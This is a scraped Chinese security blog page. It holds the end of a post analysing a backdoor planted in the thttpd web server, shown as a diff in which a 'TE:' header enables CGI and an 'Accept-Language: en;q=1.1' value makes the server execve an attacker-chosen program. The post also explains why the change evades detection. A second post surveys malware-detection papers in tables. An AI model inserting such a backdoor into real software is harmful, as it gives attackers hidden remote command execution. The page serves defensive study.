class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">*** /thttpd/libhttpd.c</span><br><span class="line"></span><br><span class="line">--- malware/libhttpd.c</span><br><span class="line"></span><br><span class="line">*************** <span class="title function_">httpd_parse_request</span><span class="params">( httpd_conn* hc )</span></span><br><span class="line"></span><br><span class="line">*** 2102,2107 ****</span><br><span class="line"></span><br><span class="line">--- 2102,2113 ----</span><br><span class="line"></span><br><span class="line">cp += <span class="built_in">strspn</span>( cp, <span class="string">&quot; \t&quot;</span> );</span><br><span class="line"></span><br><span class="line">hc-&gt;useragent = cp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">+ <span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( buf, <span class="string">&quot;TE:&quot;</span>, <span class="number">3</span> ) == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">+ &#123;</span><br><span class="line"></span><br><span class="line">+ cp = &amp;buf[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">+ cp += <span class="built_in">strspn</span>( cp, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line"></span><br><span class="line">+ hc-&gt;hs-&gt;cgi_pattern = cp;</span><br><span class="line"></span><br><span class="line">+ &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( buf, <span class="string">&quot;Host:&quot;</span>, <span class="number">5</span> ) == <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">cp = &amp;buf[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">*************** cgi_child( httpd_conn* hc )</span><br><span class="line"></span><br><span class="line">*** <span class="number">3560</span>,<span class="number">3565</span> ****</span><br><span class="line"></span><br><span class="line">--- <span class="number">3566</span>,<span class="number">3576</span> ----</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* HAVE_SIGSET */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Run the program. */</span></span><br><span class="line"></span><br><span class="line">+ <span class="keyword">if</span> ( <span class="built_in">strstr</span>( hc-&gt;acceptl, <span class="string">&quot;en;q=1.1&quot;</span>) != (<span class="type">char</span>*)<span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">+ &#123;</span><br><span class="line"></span><br><span class="line">+ binary = argp[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">+ argp++;</span><br><span class="line"></span><br><span class="line">+ &#125;</span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>) execve( binary, argp, envp );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Something went wrong. */</span></span><br></pre></td></tr></table></figure>
<p>后门会根据http头判断是否开启cgi功能，并根据http头Accept-Language决定解析执行文件的路径。上述代码段中，首先通过http头TE:设置开启cgi功能（对应上述代码中，httpd_parse_request函数中插入的else
if ( strncasecmp( buf, "TE:", 3 ) == 0)
{...}代码块）。而下游代码同样巧妙，指定特殊的Accept-Language:
en;q=1.1决定是否执行指定的系统命令（即cgi_child函数插入的if ( strstr(
hc-&gt;acceptl, "en;q=1.1") != (char*)0 ) {...}代码块）。</p>
<p>本例恶意行为的主要特点：</p>
<ul>
<li>该后门的嵌入，新增代码量极小（共7行），巧妙借用了thttpd处理用户请求、cgi的原本逻辑，借用了execve的调用，没有任何新增的API调用等行为，可以躲避有意识的行为特征匹配检测。</li>
<li>该后门在代码中的插入，分布在了存在逻辑关联的上下游两个位置，在源代码分析领域，属于过程间代码扫描问题，对于基于语义的源代码静态扫描方案也提出了很高的要求。</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://powerlzy.github.io/posts/2GBZRTM/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat_mac.jpg">
      <meta itemprop="name" content="lzy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PowerLZY's Blog">
      <meta itemprop="description" content="相比到达的地方，同行的人更重要！">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | PowerLZY's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/2GBZRTM/" class="post-title-link" itemprop="url">恶意软件检测（14）MALWARE综述</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-08-12 16:29:26" itemprop="dateCreated datePublished" datetime="2021-08-12T16:29:26+08:00">2021-08-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-04-26 17:25:14" itemprop="dateModified" datetime="2023-04-26T17:25:14+08:00">2023-04-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">【draft】应用</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%AD%A6%E6%9C%AF%E5%89%8D%E6%B2%BF/" itemprop="url" rel="index"><span itemprop="name">学术前沿</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%AD%A6%E6%9C%AF%E5%89%8D%E6%B2%BF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>26k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>47 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1><span id="malware">MALWARE</span></h1>
<p>[TOC]</p>
<h2><span id="0补充">0.补充</span></h2>
<blockquote>
<p>综述：</p>
<p>Malconv</p>
<p>数据集</p>
</blockquote>
<h2><span id="1-survey-overview">1. Survey Overview</span></h2>
<blockquote>
<p>Period :2014-2021</p>
</blockquote>
<ul>
<li><h5><span id="platform">Platform</span></h5>
<ul>
<li>Windows [13,32]</li>
<li>Android [1-3,11,14,16,18,23,25,33,35-37,40]</li>
<li>Linux</li>
</ul></li>
<li><h5><span id="direction">Direction</span></h5>
<ul>
<li>Malware features from various aspects [1,9,24,28,31,40]</li>
<li>Malware propagation(传播) [2,25]</li>
<li>System mechanisms or services against malware [3,37]</li>
<li>Malware behaviors [5,15]
<ul>
<li>Obfuscation [8,37]</li>
<li>Packing [8]</li>
<li>Stealth technologies [3,6]</li>
<li>Hook</li>
<li>Evasion from dynamic analysis [10,17,20,31,62]</li>
</ul></li>
<li>Dataset challenges, such as aging problem [21,23,41,51]</li>
<li>Performance metrics[14,23]</li>
<li>Specific malware：such as IoT malware[25,26,39], fileless[30] and
PDF malware[43,54]</li>
<li>Visualization [15]</li>
<li>Graph representation [22]</li>
<li><strong>Detection Methods</strong> [3-4,8,9,11,12,14,16,19,31,33,36]
<ul>
<li>ML based techniques [13,18,21,29,38,40]</li>
<li>DL based techniques [22,29,35]</li>
</ul></li>
<li><strong>APT</strong>(Advanced Persistent Threats) [20]</li>
<li><strong>Adversarial malware example generation</strong> [27,32]</li>
<li>ML/DL flaws [7,28]</li>
<li>ML/DL interpretability [34]</li>
</ul></li>
</ul>
<h2><span id="2-android-malware-detection">2. Android Malware detection</span></h2>
<h3><span id="21-behavior-detection-6364">2.1 Behavior detection [63,64]</span></h3>
<table>
<colgroup>
<col style="width: 27%">
<col style="width: 1%">
<col style="width: 26%">
<col style="width: 21%">
<col style="width: 22%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Motivation</th>
<th>Goal</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Malton:Towards On-Device Non-Invasive Mobile Malware Analysis for
ART</td>
<td>2017</td>
<td>Toprovide a comprehensive view of malware’s behaviors</td>
<td>Detectingeffectively</td>
<td>multi-layermonitoring &amp; information flow tracking</td>
</tr>
<tr class="even">
<td>CopperDroid:Automatic Reconstruction of Android Malware
Behaviors</td>
<td>2015</td>
<td>Toidentify OS- and high-level Android-specific behaviors.</td>
<td>Toreconstruct the behaviors of Android malware</td>
<td>VMI-baseddynamic analysis</td>
</tr>
</tbody>
</table>
<h3><span id="22-signature-based-6566">2.2 Signature based [65,66]</span></h3>
<table>
<colgroup>
<col style="width: 27%">
<col style="width: 1%">
<col style="width: 20%">
<col style="width: 23%">
<col style="width: 27%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Motivation</th>
<th>Goal</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>EnMobile: Entity-based Characterization and Analysis of Mobile</td>
<td>2018</td>
<td>Tocharacaterize malware comprehensively</td>
<td>Detectingeffectively</td>
<td>entity-based characterization and static analysis; signature based
approach</td>
</tr>
<tr class="even">
<td>Screening smartphone applications using malware family
signatures</td>
<td>2015</td>
<td>Toimprove the robustness of signature matching</td>
<td>Toautomaticly extract family signature and matching</td>
<td>family signature</td>
</tr>
</tbody>
</table>
<h3><span id="23-rule-based6768">2.3 Rule based[67,68]</span></h3>
<table>
<colgroup>
<col style="width: 37%">
<col style="width: 2%">
<col style="width: 12%">
<col style="width: 12%">
<col style="width: 35%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Motivation</th>
<th>Goal</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Toward a more dependable hybrid analysis of android malware using
aspect-oriented programming</td>
<td>2018</td>
<td>None.</td>
<td>Detectingeffectively</td>
<td>dataflowanalysis, detection of resource abuse;rule based</td>
</tr>
<tr class="even">
<td>DroidNative: Automating and optimizing detection of Android native
code malware variants</td>
<td>2017</td>
<td>Todefeat obfuscation</td>
<td>Detectingeffectively</td>
<td>specific control flow patterns;rule based</td>
</tr>
</tbody>
</table>
<h3><span id="24-similarity-based">2.4 Similarity based</span></h3>
<h4><span id="241-model-similarity69-73">2.4.1 Model similarity[69-73]</span></h4>
<table>
<colgroup>
<col style="width: 33%">
<col style="width: 2%">
<col style="width: 21%">
<col style="width: 11%">
<col style="width: 32%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Motivation</th>
<th>Goal</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>An HMM and structural entropy based detector for Android malware: An
empirical study</td>
<td>2016</td>
<td>Todefeat hiding</td>
<td>Detectingeffectively</td>
<td>HiddenMarkov Model, structural entropy.</td>
</tr>
<tr class="even">
<td>Scalable and robust unsupervised android malware fingerprinting
using community-based network partitioning</td>
<td>2020</td>
<td>Todefeat obfuscation</td>
<td>Detectingeffectively</td>
<td>maliciouscommunity</td>
</tr>
<tr class="odd">
<td>On the use of artificial malicious patterns for android malware
detection</td>
<td>2020</td>
<td>Todefeat obfuscation</td>
<td>Detectingeffectively</td>
<td>malwarepatterns; Genetic Algorithm (GA); Apriori algorithm</td>
</tr>
<tr class="even">
<td>Andro-Dumpsys: Anti-malware system based on the similarity of
malware creator and malware centric information</td>
<td>2016</td>
<td>Todefeat packing, dynamic loading etc.</td>
<td>Detectingeffectively</td>
<td>similarity matching of malware creator-centric</td>
</tr>
<tr class="odd">
<td>Bayesian Active Malware Analysis</td>
<td>2020</td>
<td>None.</td>
<td>Detectingeffectively</td>
<td>the Markov chain models</td>
</tr>
</tbody>
</table>
<h4><span id="242-graph-similarity74-79">2.4.2 Graph similarity[74-79]</span></h4>
<table>
<colgroup>
<col style="width: 30%">
<col style="width: 2%">
<col style="width: 23%">
<col style="width: 12%">
<col style="width: 30%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Motivation</th>
<th>Goal</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>PermPair: Android Malware Detection Using Permission Pairs</td>
<td>2020</td>
<td>Tomake use of permission information</td>
<td>Todetect Android malware</td>
<td>The comparasion of the graph of permission pairs.</td>
</tr>
<tr class="even">
<td>Apposcopy: Semantics-Based Detection of Android Malware through
Static Analysis</td>
<td>2014</td>
<td>Toimprove signature based methods</td>
<td>Detectingeffectively</td>
<td>combination of static taint analysis and program representation
called Inter-Component Call Graph</td>
</tr>
<tr class="odd">
<td>Profiling user-trigger dependence for Android malware detection</td>
<td>2015</td>
<td>Tocapture stealthily launch operation</td>
<td>Detectingeffectively</td>
<td>Graphcomparision</td>
</tr>
<tr class="even">
<td>Identifying Android Malware Using Network-Based Approaches</td>
<td>2019</td>
<td>Tomake use of network information</td>
<td>Detectingeffectively</td>
<td>aweighted network to compare closeness</td>
</tr>
<tr class="odd">
<td>Cypider: Building Community-Based Cyber-Defense Infrastructure for
Android Malware Detection</td>
<td>2016</td>
<td>Todeal with endless new malware</td>
<td>Detectingeffectively</td>
<td>scalablesimilarity network infrastructure;malicious community</td>
</tr>
<tr class="even">
<td>Semantics-Aware Android Malware Classification Using Weighted
Contextual API Dependency Graphs</td>
<td>2014</td>
<td>Tocharacaterize malware from program semantics</td>
<td>Detectingeffectively</td>
<td>a weighted contextual API dependency graph as program
semantics;graphsimilarity metrics</td>
</tr>
</tbody>
</table>
<h3><span id="25-ml-based-6080-101">2.5 ML based [60,80-101]</span></h3>
<table>
<colgroup>
<col style="width: 24%">
<col style="width: 1%">
<col style="width: 24%">
<col style="width: 24%">
<col style="width: 24%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Motivation</th>
<th>Goal</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>MAMADROID:Detecting Android Malware by Building Markov
Chains of Behavioral Models</strong></td>
<td>2017</td>
<td>Todesign robust malware mitigation techniques</td>
<td>Constructinga classifier</td>
<td>BuildingMarkov Chains of Behavioral Models;Random Forests , Nearest
Neighbor (1-NN) ,3-Nearest Neighbor (3-NN) ,and Support Vector Machines
(SVM)</td>
</tr>
<tr class="even">
<td><strong>Drebin:Effective and Explainable Detection of Android
Malware in Your Pocket</strong></td>
<td>2014</td>
<td>Tomitigate the influence on limited resources in Android
platform</td>
<td>To propose a lightweight method to detect malware at run-time</td>
<td>Staticanalysis and SVM</td>
</tr>
<tr class="odd">
<td>MakeEvasion Harder: An Intelligent Android Malware Detection
System</td>
<td>2018</td>
<td>Todetect evolving Android malware</td>
<td>Higherdetection rate</td>
<td>APIcalls and higher-level semantics; SVM</td>
</tr>
<tr class="even">
<td>UsingLoops For Malware Classification Resilient to Feature-unaware
Perturbations</td>
<td>2018</td>
<td>Tosolve feature-unaware perturbation</td>
<td>Todetect malware resilient to feature-unaware perturbation</td>
<td>Looplocating and random forest</td>
</tr>
<tr class="odd">
<td>SemanticModelling of Android Malware for Effective Malware
Comprehension, Detection,and Classification</td>
<td>2016</td>
<td>Tomake use of semantic information</td>
<td>Todetect Android malware</td>
<td>Semanticmodel; Random forest</td>
</tr>
<tr class="even">
<td>Detecting Android Malware Leveraging Text Semantics of Network
Flows</td>
<td>2018</td>
<td>Tomake use of network information</td>
<td>Todetect Android malware</td>
<td>Usingthe text semantics of network traffic; SVM</td>
</tr>
<tr class="odd">
<td>Improving Accuracy of Android Malware Detection with Lightweight
Contextual Awareness</td>
<td>2018</td>
<td>Toreduce redundant metadata in modeling</td>
<td>ImprovingAccuracy of Android Malware Detection</td>
<td>KNN;RF;MLP</td>
</tr>
<tr class="even">
<td>MalScan: Fast Market-Wide Mobile Malware Scanning by Social-Network
Centrality Analysis</td>
<td>2019</td>
<td>Toreduce the cost of semantic analysis</td>
<td>To propose a lightweight method to detect malware</td>
<td>social-network-basedcentrality analysis; kNN and random forest</td>
</tr>
<tr class="odd">
<td>PIndroid: A novel Android malware detection system using ensemble
learning methods</td>
<td>2017</td>
<td>Tofight against covert technique of malware</td>
<td>Detectingeffectively</td>
<td>Permissionsand Intents based framework supplemented with Ensemble
methods:Nave Bayesian,Decision Tree, Decision Table, Random Forest,
Sequential Minimal Optimization and Multi Lateral Perceptron(MLP)</td>
</tr>
<tr class="even">
<td>A pragmatic android malware detection procedure</td>
<td>2017</td>
<td>Todesign a new ML model</td>
<td>Detectingeffectively</td>
<td>Atomic Naive Bayes classifiers used as inputs for the Support Vector
Machine ensemble.</td>
</tr>
<tr class="odd">
<td>ICCDetector: ICC-Based Malware Detection on Android</td>
<td>2016</td>
<td>Tocapture communication among components or cross boundaries to
supplymentfeatures</td>
<td>Detectingeffectively</td>
<td>SVM</td>
</tr>
<tr class="even">
<td>A Probabilistic Discriminative Model for Android Malware Detection
with Decompiled Source Code</td>
<td>2015</td>
<td>None.</td>
<td>Detectingeffectively</td>
<td>the 2-class Naive Bayes with Prior (2-PNB) and a discriminative
model,the regularized logistic regression</td>
</tr>
<tr class="odd">
<td>DroidCat: Effective Android Malware Detection and Categorization via
App-Level Profiling</td>
<td>2019</td>
<td>Tofight against systemcall obfuscation</td>
<td>Detectingeffectively</td>
<td>Dynamicanalysis based on method calls and inter-component
communication; RandomForest</td>
</tr>
<tr class="even">
<td>MADAM: Effective and Efficient Behavior-based Android Malware
Detection and Prevention</td>
<td>2018</td>
<td>None.</td>
<td>Detectingeffectively</td>
<td>KNN</td>
</tr>
<tr class="odd">
<td>==Android Malware Detection via (Somewhat) Robust Irreversible
Feature Transformations==</td>
<td>2020</td>
<td>Toavoid ML classifier evading</td>
<td>Transferingfeatures to a new feature domain</td>
<td>Classifiers used:(1) Bernoulli Naive Bayes, (2) Random Forest, (3)
NearestNeighbors, (4) Logistic Regression, (5) Gaussian Naive Bayes, (6)
AdaBoost Classifier, (7) Gradient Boosting Decision Tree, (8) XGB
Classifier and (9)SVM.</td>
</tr>
<tr class="even">
<td>Leveraging ontologies and machine-learning techniques for malware
analysis into Android permissions ecosystems</td>
<td>2018</td>
<td>None.</td>
<td>Detectingeffectively</td>
<td>ontology-basedframework;random forest</td>
</tr>
<tr class="odd">
<td>Lightweight, Obfuscation-Resilient Detection and Family
Identification of Android Malware</td>
<td>2018</td>
<td>Todefeat obfuscation</td>
<td>Detectingeffectively</td>
<td>familyidentification;linear SVM</td>
</tr>
<tr class="even">
<td>A multi-view context-aware approach to Android malware detection and
malicious code localization</td>
<td>2018</td>
<td>To characaterize malware comprehensively</td>
<td>Detectingeffectively</td>
<td>multipleviews of apps;SVM</td>
</tr>
<tr class="odd">
<td>DroidFusion: A Novel Multilevel Classifier Fusion Approach for
Android Malware Detection</td>
<td>2019</td>
<td>Toimprove classifier</td>
<td>Detectingeffectively</td>
<td>CLASSIFIER FUSION:J48, REPTree, voted perceptron, and random
tree</td>
</tr>
<tr class="even">
<td>DL-Droid: Deep learning based android malware detection using real
devices</td>
<td>2020</td>
<td>Todefeat obfuscation</td>
<td>Detectingeffectively</td>
<td>input generation;MLP</td>
</tr>
<tr class="odd">
<td>JOWMDroid: Android malware detection based on feature weighting with
joint optimization of weight-mapping and classifier parameters</td>
<td>2021</td>
<td>Tocharacaterize malware from feature importance</td>
<td>Detectingeffectively</td>
<td>featureweighting with the joint optimization of weight-mapping;SVM,
LR, MLP</td>
</tr>
<tr class="even">
<td>Towards using unstructured user input request for malware
detection</td>
<td>2020</td>
<td>Todefeat privacy analysis evading</td>
<td>Detectingeffectively</td>
<td>decision tree</td>
</tr>
</tbody>
</table>
<h3><span id="26-dl-based-102-109">2.6 DL based [102-109]</span></h3>
<table>
<colgroup>
<col style="width: 32%">
<col style="width: 2%">
<col style="width: 32%">
<col style="width: 11%">
<col style="width: 22%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Motivation</th>
<th>Goal</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Toward s an interpretable deep learning model for mobile malware
detection and family identification</td>
<td>2021</td>
<td>Topropose a interpretable DL model</td>
<td>Detectingreasonablely</td>
<td>DL:Grad-CAM</td>
</tr>
<tr class="even">
<td>AMalNet: A deep learning framework based on graph convolutional
networks for malware detection</td>
<td>2020</td>
<td>Tohave a lower cost</td>
<td>Detectingeffectively</td>
<td>DL:GCNsand IndRNN</td>
</tr>
<tr class="odd">
<td>Disentangled Representation Learning in Heterogeneous Information
Network for Large-scale Android Malware Detection in the COVID-19 Era
and Beyond</td>
<td>2021</td>
<td>Tosolve the problem that society relys on the complex
cyberspace</td>
<td>Detectingeffectively</td>
<td>heterogeneousinformation network (HIN);DNN</td>
</tr>
<tr class="even">
<td>A Multimodal Deep Learning Method for Android Malware Detection
Using Various Features</td>
<td>2019</td>
<td>Tocharacaterize malware comprehensively</td>
<td>Detectingeffectively</td>
<td>multimodaldeep learning method;DNN</td>
</tr>
<tr class="odd">
<td>Android Fragmentation in Malware Detection</td>
<td>2019</td>
<td>Todeal with multiple Android version</td>
<td>Detectingeffectively</td>
<td>Deep Neural Network</td>
</tr>
<tr class="even">
<td>An Image-inspired and CNN-based Android Malware Detection
Approach</td>
<td>2019</td>
<td>Todefeat obfuscation</td>
<td>Detectingeffectively</td>
<td>CNN</td>
</tr>
<tr class="odd">
<td>A Performance-Sensitive Malware Detection System Using Deep Learning
on Mobile Devices</td>
<td>2021</td>
<td>Toreduce time cost of download and upload</td>
<td>Detectingfastly</td>
<td>customized DNN</td>
</tr>
<tr class="even">
<td>Byte-level malware classification based on markov images and deep
learning</td>
<td>2020</td>
<td>Toimprove the accuracy of gray image based methods</td>
<td>Detectingeffectively</td>
<td>deep convolutional neural network</td>
</tr>
</tbody>
</table>
<h2><span id="3-windows-malware-detection">3 Windows Malware detection</span></h2>
<h3><span id="31-behavior-detection-110111">3.1 Behavior detection [110,111]</span></h3>
<table style="width:100%;">
<colgroup>
<col style="width: 68%">
<col style="width: 4%">
<col style="width: 27%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Creativity</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>API Chaser: Anti-analysis Resistant Malware Analyzer</td>
<td>2013</td>
<td>API call feature capture</td>
</tr>
<tr class="even">
<td>MalViz: An Interactive Visualization Tool for Tracing Malware</td>
<td>2018</td>
<td>Behavior visualization</td>
</tr>
</tbody>
</table>
<h3><span id="32-signature-based-112">3.2 Signature based [112]</span></h3>
<table>
<colgroup>
<col style="width: 76%">
<col style="width: 5%">
<col style="width: 17%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Creativity</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>CloudEyes: Cloud-based malware detection with reversible sketch for
resource-constrained internet of things (IoT) devices</td>
<td>2017</td>
<td>Based on cloud</td>
</tr>
</tbody>
</table>
<h3><span id="33-rule-based113">3.3 Rule based[113]</span></h3>
<table>
<colgroup>
<col style="width: 77%">
<col style="width: 5%">
<col style="width: 16%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Creativity</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>A fast malware detection algorithm based on objective-oriented
association mining</td>
<td>2013</td>
<td>API selection</td>
</tr>
</tbody>
</table>
<h3><span id="34-similarity-based">3.4 Similarity based</span></h3>
<h4><span id="341-model-similarity114-122">3.4.1 Model similarity[114-122]</span></h4>
<table>
<colgroup>
<col style="width: 48%">
<col style="width: 3%">
<col style="width: 48%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Creativity</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>PoMMaDe: Pushdown Model-checking for Malware Detection</td>
<td>2013</td>
<td>model checking</td>
</tr>
<tr class="even">
<td>Growing Grapes in Your Computer to Defend Against Malware</td>
<td>2014</td>
<td>clustering and template matching</td>
</tr>
<tr class="odd">
<td>Hypervisor-based malware protection with AccessMiner</td>
<td>2015</td>
<td>system-centric behavioral detector</td>
</tr>
<tr class="even">
<td>Probabilistic Inference on Integrity for Access Behavior Based
Malware Detection</td>
<td>2015</td>
<td>probabilistic model of integrity</td>
</tr>
<tr class="odd">
<td>Probabilistic analysis of dynamic malware traces</td>
<td>2018</td>
<td>1.Features of system interaction 2. interpretability</td>
</tr>
<tr class="even">
<td>A malware detection method based on family behavior graph</td>
<td>2018</td>
<td>common behavior graph</td>
</tr>
<tr class="odd">
<td>Malware classification using self organising feature maps and
machine activity data</td>
<td>2018</td>
<td>1.The improvement of ML. to reduce over-fitting 2. Self Organizing
Feature Maps</td>
</tr>
<tr class="even">
<td>Volatile memory analysis using the MinHash method for efficient and
secured detection of malware in private cloud</td>
<td>2019</td>
<td>Based on memory features</td>
</tr>
<tr class="odd">
<td>A dynamic Windows malware detection and prediction method based on
contextual understanding of API call sequence</td>
<td>2020</td>
<td>1.Contextual relationship between API call features 2.
Marcovchain</td>
</tr>
</tbody>
</table>
<h4><span id="342-graph-similarity123-127">3.4.2 Graph similarity[123-127]</span></h4>
<table>
<colgroup>
<col style="width: 55%">
<col style="width: 3%">
<col style="width: 40%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Creativity</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Deriving common malware behavior through graph clustering</td>
<td>2013</td>
<td>common behavior graph</td>
</tr>
<tr class="even">
<td>Enhancing the detection of metamorphic malware using call
graphs</td>
<td>2014</td>
<td>API call graph matching</td>
</tr>
<tr class="odd">
<td>Minimal contrast frequent pattern mining for malware detection</td>
<td>2016</td>
<td>Graph matching</td>
</tr>
<tr class="even">
<td><strong>Heterogeneous Graph Matching Networks for Unknown Malware
Detection</strong></td>
<td>2019</td>
<td>Graph matching similarity of benign software</td>
</tr>
<tr class="odd">
<td>Random CapsNet for est model for imbalanced malware type
classification task</td>
<td>2021</td>
<td>The improvement of the Model</td>
</tr>
</tbody>
</table>
<h3><span id="35-ml-based-128-143">3.5 ML based [128-143]</span></h3>
<table>
<colgroup>
<col style="width: 46%">
<col style="width: 6%">
<col style="width: 46%">
</colgroup>
<thead>
<tr class="header">
<th>Title</th>
<th>Year</th>
<th>Creativity</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>A Scalable Approach for Malware Detection through Bounded Feature
Space Behavior Modeling</td>
<td>2013</td>
<td>Scalable feature space</td>
</tr>
<tr class="even">
<td>SigMal: A Static Signal Processing Based Malware Triage</td>
<td>2013</td>
<td>noise-resistant similarity signatures</td>
</tr>
<tr class="odd">
<td>Unsupervised Anomaly-Based Malware Detection Using Hardware
Features</td>
<td>2014</td>
<td>hardware supported lower-level features</td>
</tr>
<tr class="even">
<td>Control flow-based opcode behavior analysis for Malware
detection</td>
<td>2014</td>
<td>Based on control flow method features</td>
</tr>
<tr class="odd">
<td>Employing Program Semantics for Malware Detection</td>
<td>20152021</td>
<td>Extracting information-rich call sequence based on AEPThe
improvement of the Model</td>
</tr>
<tr class="even">
<td>AMAL: High-fidelity, behavior-based automated malware analysis and
classification</td>
<td>2015</td>
<td>Based on behavior analysis</td>
</tr>
<tr class="odd">
<td>Optimized Invariant Representation of Network Traffic for Detecting
Unseen Malware Variants</td>
<td>2016</td>
<td>Network features</td>
</tr>
<tr class="even">
<td>DYNAMINER: Leveraging Offline Infection Analytics for On-the-Wire
Malware Detection</td>
<td>2017</td>
<td>Network features</td>
</tr>
<tr class="odd">
<td>Security importance assessment for system objects and malware
detection</td>
<td>2017</td>
<td>Based on importance of system objects</td>
</tr>
<tr class="even">
<td>From big data to knowledge: A spatiotemporal approach to malware
detection</td>
<td>2018</td>
<td>cloud based security service features</td>
</tr>
<tr class="odd">
<td>From big data to knowledge: A spatiotemporal approach to malware
detection</td>
<td>2018</td>
<td>cloud based security service features</td>
</tr>
<tr class="even">
<td>MalDAE: Detecting and explaining malware based on correlation and
fusion of static and dynamic characteristics</td>
<td>2019</td>
<td>fusion of static and dynamic API sequence features</td>
</tr>
<tr class="odd">
<td>Leveraging Compression-Based Graph Mining for Behavior-Based Malware
Detection</td>
<td>2019</td>
<td>Based on data flow graph</td>
</tr>
<tr class="even">
<td>Advanced Windows Methods on Malware Detection and
Classification</td>
<td>2020</td>
<td>API based Features extraction.</td>
</tr>
<tr class="odd">
<td>Sub-curve HMM: A malware detection approach based on partial
analysis of API call sequences</td>
<td>2020</td>
<td>1.Subset of API call feature 2. HMM</td>
</tr>
<tr class="even">
<td>Multiclass malware classification via first- and second-order
texture statistics</td>
<td>2020</td>
<td>visualization</td>
</tr>
<tr class="odd">
